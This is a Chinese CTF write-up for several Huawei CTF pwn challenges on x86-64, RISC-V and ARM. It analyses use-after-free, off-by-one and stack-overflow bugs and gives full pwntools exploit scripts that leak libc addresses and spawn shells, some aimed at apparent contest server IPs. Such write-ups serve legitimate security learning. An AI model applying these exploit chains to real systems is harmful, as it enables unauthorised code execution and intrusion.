> 原文链接: https://www.anquanke.com//post/id/226994 


# 华为三场CTF部分Pwn题解


                                阅读量   
                                **124295**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t015b91b4c5cf4bec49.jpg)](https://p1.ssl.qhimg.com/t015b91b4c5cf4bec49.jpg)



华为3场CTF的pwn题，题量都特别大，同时有很多异构Pwn，对于学习异构很有帮助。

## 第一场

### <a class="reference-link" name="cpp"></a>cpp

#### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"></a>程序分析

c++写得，不是很复杂，算是C++中的简单题。

```
if ( v11[0] != 1 )
      break;
    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &amp;out);
    std::istream::_M_extract&lt;unsigned long&gt;(&amp;std::cin, v11);
    if ( v11[0] &lt;= 0xFFuLL )                    // delete_chunk &amp;&amp; show
    `{`
      chunk_addr2 = (void **)((char *)&amp;chunk_list + 8 * v11[0]);
      old_chunk2 = *chunk_addr2;
      *chunk_addr2 = 0LL;
      if ( old_chunk2 )
      `{`
        operator delete[](old_chunk2);
        puts((const char *)old_chunk2);
        std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &amp;out);
        get_input(old_chunk2, 8LL);             // UAF
      `}`
    `}`
```

漏洞很明显，在程序最后存在一个UAF输出函数可以供我们泄露地址，最后还存在一个读函数，可以让我们释放后修改堆内容。

虽然是 2.31的环境，但是影响不大。

#### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"></a>利用分析

思路很常规，先通过tcache泄露堆地址。

然后先填充tcache_bin的个数为7，劫持tache_struct_perthread这个结构体，申请0x291的堆块，释放到unsortedbin来泄露地址。

最后tcache_poisoning 攻击劫持 free_hook。

#### <a class="reference-link" name="EXP"></a>EXP

```
from pwn import *
context.update(arch='amd64', os='linux', log_level='debug')
context.terminal=(['tmux', 'splitw', '-h'])

filename = './chall'
debug = 1
if debug == 1:
    p = process(filename)
    elf =ELF(filename)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def Add(content, idx):
    p.sendlineafter('&gt; ', '0')
    p.sendafter('&gt; ', content)
    p.sendlineafter('&gt; ', str(idx))

def Delete(idx, content):
    p.sendlineafter('&gt; ', '1')
    p.sendlineafter('&gt; ', str(idx))
    p.sendafter('&gt; ', content)

def Delete2(idx):
    p.sendlineafter('&gt; ', '1')
    p.sendlineafter('&gt; ', str(idx))

def Pwn():
    for i in range(2):
        Add('a'*7, i)
    Add('a'*7, 7)
    Add('a'*7, 8)
    gdb.attach(p, 'bp $rebase(0x14f8)')
    Delete(1, 'a'*7)
    Delete2(0)
    heap_addr = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))
    print('heap_addr:',hex(heap_addr))
    payload = p64(heap_addr-0x11ed0+0x58)
    #print('heap_struct:',hex(payload))
    p.sendafter('&gt; ', payload[:7])

    Add('a'*7, 1)
    print("tcache_struct attack")
    payload = b'\x07\x00'*3+'\x07'
    Add(payload, 2)

    for i in range(3,5):
        Add('a'*7, i)

    Delete(4, 'a'*7)
    payload = p64(heap_addr-0x11ed0+0x10)
    Delete(3, payload[:7])

    Add('a'*7, 5)
    #tcache_struct
    Add('a'*7, 6)

    Delete2(6)
    libc_addr = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00'))
    libc_base = libc_addr - 96 - 0x10 - libc.sym['__malloc_hook']
    print('libc_base:',hex(libc_base))

    free_hook = libc.sym['__free_hook']+libc_base
    system_addr = libc.sym['system']+libc_base
    print('system:',hex(system_addr))
    p.sendafter('&gt; ', '\x00'*7)

    Delete(7, 'a'*7)
    Delete2(8)

    payload = p64(free_hook)
    p.sendafter('&gt; ', payload[:7])

    Add(b'/bin/sh', 9)
    #free_hook
    payload = p64(system_addr)
    Add(payload[:7], 10)

    Delete(9, 'a'*7)

    p.interactive()

Pwn()
```

### <a class="reference-link" name="game"></a>game

这道题难点，在于如何进入read的栈溢出，由于每次程序传输的表达式都是变化的，需要我们自动化的写一个能够进入read函数的代码。那么很自然的想到符号执行的经典工具：angr，这里就不放angr代码了。

#### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"></a>程序分析

```
__int64 __fastcall sub_4006F9(int a1)
`{`
  int v2; // [rsp+Ch] [rbp-1C4h] BYREF
  char buf[440]; // [rsp+10h] [rbp-1C0h] BYREF
  unsigned __int8 *v4; // [rsp+1C8h] [rbp-8h]

  v2 = a1;
  v4 = (unsigned __int8 *)&amp;v2;
  if ( 9170 * BYTE1(a1) * (a1 &amp; 0x8C)
    || 64437 % v4[2] + 60157 / v4[2] != 633
    || (54606 - v4[2]) * (58781 - v4[1]) != -1105261920
    || 33721 / *v4 - 36925 / v4[3] != 1082 )
  `{`
    return 0LL;
  `}`
  read(0, buf, 0x331uLL);
  return 1LL;
`}`
```

如果就单静态程序分析来说，这里存在一个很明显的栈溢出，而且溢出长度很大。

#### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"></a>利用分析

这道题，和前不久的蓝帽杯决赛的pwn3很类似，都是明显的栈溢出。但是那道Pwn3当时用的投机做法，直接用 高位地址做滑板指令修改 libc_start_main地址为 gadget地址。需要靠运气爆破，成功几率并不高。

这道题，当时xmzyshyphc学长给我说了一个方法，即 修改 got表里的一个函数地址为 syscall地址。然后利用 libc_csu和 syscall来实现函数调用。

但这里，有几个小技巧：

如何选取syscall地址：

建议选择函数内部调用了syscall的got表地址，这样我们就只需要覆写最低位的一字节偏移或一位偏移，成功率极高。

```
► 0x7ffff7ad9280 &lt;alarm&gt;       mov    eax, 0x25
   0x7ffff7ad9285 &lt;alarm+5&gt;     syscall 
   0x7ffff7ad9287 &lt;alarm+7&gt;     cmp    rax, -0xfff
   0x7ffff7ad928d &lt;alarm+13&gt;    jae    alarm+16 &lt;alarm+16&gt;
```

如上所示，alarm函数 +5处 即是一个 syscall。那么我们选择将 alarm_got 的最低一字节改为 0x85即可。

如何getshell：

由于有了syscall和 csu，我们可以直接先考虑能不能找到一个 pop rax, ret的 gadget，这样我们后续就能够不用泄露libc地址，直接调用 system。但是没有合适的 pop rax, ret。这里的技巧为，当我们使用 read读取 /bin/sh到 bss段上时，我们可以在后面填充到 59个字符，这样read函数返回值为rax= 59，这样我们如果接着执行 syscall，那么就能够直接执行 execve函数。

#### <a class="reference-link" name="EXP"></a>EXP

```
from pwn import *
context.update(arch='amd64', os='linux', log_level='debug')
context.terminal=(['tmux', 'splitw', '-h'])

filename = "./pwn-1"
debug = 1
if debug == 1:
    p = process(['./pwn-1', '611252752'])
    elf = ELF(filename)
    libc = ('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('')
    elf = ELF(filename)
    libc = ('/lib/x86_64-linux-gnu/libc.so.6')

csu_end_addr = 0x4008ca
csu_front_addr = 0x4008b0
fakeebp = 0xdeadbeef
def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x1c0 + p64(fakeebp)
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    return payload

def csu2(rbx, rbp, r12, r13, r14, r15, last):
    payload = p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    return payload

def csu3(rbx, rbp, r12, r13, r14, r15, last):
    payload = p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    return payload

main_addr = 0x4007e9
def Pwn():
    read_plt = 0x601020
    alarm_got = 0x601018
    bin_sh_addr = 0x6010a0
    gdb.attach(p, 'bp 0x4007fd')
    #change alarm_got to syscall
    payload = csu(0, 1, read_plt, 1, alarm_got, 0, csu_end_addr) + csu2(0,1,read_plt,59,bin_sh_addr,0, csu_end_addr)+csu3(0,1,alarm_got,0,0,bin_sh_addr,main_addr)
    p.send(payload)
    raw_input()
    p.send(b'\x85')

    raw_input()
    p.send(b'/bin/sh\x00'.ljust(59, '\x00'))

    p.interactive()

Pwn()
```

## 第二场

### <a class="reference-link" name="honorbook"></a>honorbook

基于 riscv架构的，IDA不能反汇编，后面选择用 ghidra，发现也反汇编不了。但是，官网现在最新版的ghidra可以。一旦能够反汇编，这道题其实挺常规的。

#### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"></a>程序分析

```
void add(void)

`{`
  longlong lVar1;
  char *chunk_ptr;
  void *name;
  void *chunk;
  char *size;
  ulonglong idx;

  lVar1 = __stack_chk_guard;
  std::__ostream_insert&lt;char,std::char_traits&lt;char&gt;&gt;((basic_ostream *)std::cout,"ID: ",4);
  scanf("%ld");
  if (idx &lt; 0x30) `{`
    if (*(longlong *)(&amp;gp0xfffffffffffffa60 + idx * 8) == 0) `{`
      name = operator.new(0x20);
      std::__ostream_insert&lt;char,std::char_traits&lt;char&gt;&gt;
                ((basic_ostream *)std::cout,"User name: ",0xb);
      read(0,name,0x18);
      chunk = malloc(0xe8);
      *(void **)((longlong)name + 0x18) = chunk;
      std::__ostream_insert&lt;char,std::char_traits&lt;char&gt;&gt;((basic_ostream *)std::cout,"Msg: ",5);
      chunk_ptr = *(char **)((longlong)name + 0x18);
      size = chunk_ptr + 0xe9;
      do `{`
        read(0,chunk_ptr,1);
        if (*chunk_ptr == '\n') break;
        chunk_ptr = chunk_ptr + 1;
      `}` while (chunk_ptr != size);
      *(void **)(&amp;gp0xfffffffffffffa60 + idx * 8) = name;
    `}`
  `}`
  if (lVar1 == __stack_chk_guard) `{`
    return;
  `}`
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
`}`
```

在 Add函数中，在输入msg时，存在一个 off-by-one漏洞。

#### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"></a>利用分析

这道题libc是2.27的，那么就是一个简单的 tcache off-by-one漏洞，但是唯一的难点就是这道题无法使用 pwndbg等插件调试，对于看堆栈很不友好。

其次，就是其 libc地址中，总是会有 ‘\x00’出现，也就是我们输出地址时，只能输出部分地址，需要我们每次一字节的输出。

这道题的堆环境如下：

```
0x31
0xf1
0x31
0xf1
...
```

我们通过 0xf1的堆块，可以修改 0x31的堆头。做法就是修改 0x31为 0xf1，然后将其放入 tcache中，这样就可以绕过对于堆头size的检查。

然后我们再申请两次，那么就能够实现我们伪造的 fake_chunk 能够覆写 下一块 0xf1的堆块。

泄露地址时，每次覆盖一个字节，如果输出为 \n，则说明其下字节为 \x00。否则就能够输出其下一字节。

#### <a class="reference-link" name="EXP"></a>EXP

```
# encoding=utf-8
from pwn import *

file_path = "honorbook"
context.arch = "amd64"
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
debug = 1
if debug:
    p = process(['./qemu-riscv64', '-L', "libs", file_path])
    #p = remote('121.36.192.114',9999)
    e =ELF('honorbook')
    libc = ELF('./libs/lib/libc-2.27.so')
    one_gadget = 0x0

else:
    p = remote('', 0)
    libc = ELF('')
    one_gadget = 0x0


def add(index, name, content):
    p.sendlineafter("Code: ", "1")
    p.sendlineafter("ID: ", str(index))
    p.sendlineafter("User name: ", name)
    p.sendlineafter("Msg: ", content)

def add2(index, name, content):
    p.sendlineafter("Code: ", "1")
    p.sendlineafter("ID: ", str(index))
    p.sendafter("User name: ", name)
    p.sendafter("Msg: ", content)

def dlt(index):
    p.sendlineafter("Code: ", "2")
    p.sendlineafter("ID: ", str(index))


def show(index):
    p.sendlineafter("Code: ", "3")
    p.sendlineafter("ID: ", str(index))


def edit(index, content):
    p.sendlineafter("Code: ", "4")
    p.sendlineafter("Index: ", str(index))
    p.sendafter("Msg: ", content)

def Pwn():
    for i in range(9):
        add(i, b'aaaa', b'cccc')
    add(11, b'aaaa', b'cccc')
    add(12, b'aaaa', b'cccc')
    add(13, b'aaaa', b'cccc')
    add(14, b'aaaa', b'cccc')

    dlt(4)
    payload = 'a'*0xe0+p64(0)+'\xf1'
    add2(4, b'aaaa', payload)

    dlt(5)
    add(9, b'aaaa', b'cccc')    #0x30 -&gt; 0xf0
    add(10, b'aaaa', b'cccc')   #0xf0


    for i in range(5):
        dlt(i)
    dlt(6)
    dlt(7)

    dlt(10)
    libc_addr = 0
    mod = 1
    for i in range(8):
        edit(9, 'a'*(0x30+i))
        show(9)
        p.recvuntil("Msg: ")
        addr = p.recvuntil(b"\n")
        a = ord(addr[0x30+i])
        if a == 0xa:
            a = 0
        libc_addr += a*mod
        mod*=0x100
    print(hex(libc_addr))
    print(hex(libc.sym['__malloc_hook']+0x10+88))
    libc_base = libc_addr - 88 -libc.sym['__malloc_hook']-0x10
    print('libc_base:',hex(libc_base))
    free_addr = libc_base+libc.sym['__free_hook']
    print('free_addr:',hex(free_addr))
    system_addr = libc.sym['system']+libc_base
    pause()

    for i in range(5):
        add(i, b'aaa', b'ccc')


    dlt(11)
    payload ='a'*0xe0+p64(0)+'\xf1'
    add2(11, b'aaaa', payload)

    dlt(12)

    payload = 'a'*0x10
    add(15, b'aaaa', payload)   #0x30
    add(16, b'aaaa', b'cccc')   #0xf0
    pause()
    dlt(13)
    dlt(16)

    payload = 'a'*0x20+p64(0)+p64(0xf1)+p64(free_addr)
    edit(15, payload)

    add(17, b'/bin/sh\x00', b'/bin/sh\x00')

    payload = p64(system_addr)
    add(18, b'/bin/sh', payload)

    dlt(17)

    # pause()
    p.interactive()
Pwn()
```

## 第三场

### <a class="reference-link" name="HarmoShell"></a>HarmoShell

#### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"></a>程序分析

```
void echo(longlong param_1)

`{`
  longlong lVar1;
  char **chunk_list;
  char *chunk;
  int file1;
  ssize_t rsize;
  undefined4 extraout_var;
  undefined4 extraout_var_00;
  undefined4 extraout_var_01;
  size_t __nbytes;
  char *file;
  undefined8 flag;
  undefined auStack320 [264];

  lVar1 = *(longlong *)(param_1 + 8);
  file = *(char **)(lVar1 + 8);
  file1 = strcmp(file,"&gt;");
  if (CONCAT44(extraout_var,file1) == 0) `{`
    flag = 0;
  `}`
  else `{`
    file1 = strcmp(file,"&gt;&gt;");
    flag = 1;
    if (CONCAT44(extraout_var_00,file1) != 0) `{`
                    /* WARNING: Subroutine does not return */
      FUN_00011490();
    `}`
  `}`
  file = *(char **)(lVar1 + 0x10);
  chunk_list = (char **)&amp;gp0xfffffffffffffa60;
  while ((chunk = *chunk_list, chunk == (char *)0x0 ||
         (file1 = strcmp(file,chunk), CONCAT44(extraout_var_01,file1) != 0))) `{`
    chunk_list = chunk_list + 1;
    if (chunk_list == (char **)&amp;gp0xfffffffffffffbe0) `{`
      __nbytes = 0x200;
LAB_00011516:
      rsize = read(0,auStack320,__nbytes);
      copy(*(undefined8 *)(*(longlong *)(param_1 + 8) + 0x10),auStack320,(longlong)rsize,flag);
      return;
    `}`
  `}`
  __nbytes = *(size_t *)(chunk + 0x18);
  goto LAB_00011516;
`}`
```

echo函数，最后读取用户输入时，存在栈溢出。

#### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"></a>利用分析

由于是 riscv64架构的，调试不了。但是感觉总体和 mips的做法差不多。

可以找到 csu地址，利用 csu来布置 参数和执行函数。

泄露地址，则利用c++ 自己的标准输出函数来泄露地址。

#### <a class="reference-link" name="EXP"></a>EXP

```
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file_path = ["./qemu-riscv64", '-L', './libs', './harmoshell']
#p = process(file_path)
p = remote('121.36.192.114',9999)
e = ELF("./harmoshell")
libc = ELF('./libs/lib/libc-2.27.so')
csu_f_addr = 0x0001182c
csu_e_addr = 0x0001181a
def csu(addr, a0, a1, a2):
    p = p64(0)+p64(a2)+p64(a1)+p64(a0)+p64(1)+p64(0)
    p += p64(addr)+p64(csu_e_addr)
    return p

def csu_j(addr):
    p = p64(0)+p64(0)+p64(0)+p64(0)+p64(1)+p64(0)
    p += p64(0)+p64(addr)
    return p

def Pwn():
    for i in range(0x30):
        p.sendlineafter('$', 'touch '+str(i))

    cout_addr = 0x13118
    read_got = 0x13060
    stdaddr = 0x13080

    payload = b'a'*(0x138)+p64(csu_f_addr)
    payload += csu(stdaddr, cout_addr, read_got, 0x8)
    payload += csu(read_got, 0, read_got, 0x10)
    payload += csu(read_got, read_got+8, 0, 0x10)

    p.sendlineafter('$', 'touch 1')
    p.sendlineafter('$', 'echo &gt; 48')
    p.send(payload)

    data = p.recv(6)
    read_addr = u64(p.recv(6).ljust(8, b'\x00'))
    libc_base = read_addr - libc.sym['read']
    print('libc_base:',hex(libc_base))
    system_addr = libc_base + libc.sym['system']
    bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
    print('bin_sh_addr:',hex(bin_sh_addr))
    print('system_addr:',hex(system_addr))
    p.sendline(p64(system_addr)+'/bin/sh\x00')

    p.interactive()

Pwn()
```

### <a class="reference-link" name="PWNI"></a>PWNI

#### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"></a>程序分析

32位 Arm的栈溢出，做法仍然是利用 csu来布置参数和执行函数。

#### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"></a>利用分析

```
.text:00010540                 CMP             R9, R5
.text:00010544                 POPEQ           `{`R4-R10,PC`}`
.text:00010548                 LDR             R3, [R4],#4
.text:0001054C                 MOV             R2, R8
.text:00010550                 MOV             R1, R7
.text:00010554                 MOV             R0, R6
.text:00010558                 BLX             R3
.text:0001055C                 ADD             R9, R9, #1
.text:00010560                 B               loc_10540
```

32位下的csu如上所示，参数布置基本变化不大，不过这里是一个循环，我们不需要再自己调整返回值。

此外，我们必须保证 R5为1，这样才不会跳出该循环。

#### <a class="reference-link" name="EXP"></a>EXP

```
# encoding=utf-8
from pwn import *

file_path = "bin"
context.arch = "amd64"
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
debug = 0
if debug:
    #p = process(['./qemu-riscv64', '-L', "libs", '-g','1234',file_path])
    p = process(["qemu-arm", "-L", "./libc-2.31.so",  file_path])
    #p = remote('121.36.192.114',9999)
    e =ELF(file_path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = 0x0

else:
    p = remote('139.159.210.220', 9999)
    libc = ELF('./libc-2.31.so')
    one_gadget = 0x0

def Pwn():
    #p = remote('139.159.210.220', 9999)
    # p = remote("127.0.0.1", 10004)

    p.recvuntil('input: ')
    pop_r3_ret = 0x10348
    pop_s = 0x10540 #popeq `{`r4, r5, r6, r7, r8, sb, sl, pc`}`; ldr r3, [r4], #4; mov r2, r8; mov r1, r7; mov r0, r6; blx r3;
    pop_r4_ret = 0x10498
    printf_got = 0x2100c
    read_got = 0x21010
    setvbuf = 0x2101c

    payload = 'a'*0x104
    payload += p32(pop_s)+p32(printf_got) #r4
    payload += p32(1)+p32(read_got)    #r5, r6
    payload += p32(0)+p32(0)    #7, r8
    payload += p32(0)*2 + p32(0x10548)
    payload += p32(read_got)+p32(1)+p32(0)+p32(read_got)+p32(16)
    payload += p32(0)*2 + p32(0x10548)
    payload += p32(read_got)+p32(1)+p32(read_got+4)+p32(0)+p32(0)
    payload += p32(0)*2 +p32(0x10548)

    p.sendline(payload)
    read_addr = u32(p.recv(4))
    libc_base = read_addr-libc.sym['read']
    print('libc_base:',hex(libc_base))
    print('read:',hex(read_addr))
    system_addr = libc_base+libc.sym['system']
    bin_sh_addr = libc_base + next(libc.search('/bin/sh\x00'))
    print("system_addr:",hex(system_addr))
    #p.recvuntil('input: ')
    p.sendline(p32(system_addr)+'/bin/sh\x00')

    p.interactive()

Pwn()
```
